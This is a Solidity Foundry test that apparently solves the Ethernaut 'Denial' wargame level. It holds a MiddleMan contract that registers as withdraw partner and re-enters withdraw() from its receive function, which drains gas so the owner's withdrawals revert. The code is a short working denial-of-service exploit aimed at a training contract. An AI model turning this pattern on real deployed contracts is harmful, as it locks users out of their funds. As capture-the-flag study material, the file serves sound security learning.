// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Denial.sol";

contract MiddleMan {
    Denial denial;

    constructor(address payable prey) {
        denial = Denial(prey);
    }

    function register() public {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        denial.withdraw();
    }
}

contract DenialTest is Test {
    Denial instance = Denial(payable(vm.envAddress("DENIAL")));

    function test() public {
        uint256 balance = address(instance).balance;
        // vm.deal(address(instance), 100 ether);
        console.log("balance", balance);

        MiddleMan middleMan = MiddleMan(payable(vm.envAddress("DENIAL_MIDDLEMAN")));
        middleMan.register();

        vm.startPrank(address(0xA9E));
        vm.expectRevert();
        instance.withdraw{gas: 1000000}();

        // assertEq(instance.contractBalance(), 100 ether);
        assertEq(address(instance).balance, balance);
    }
}
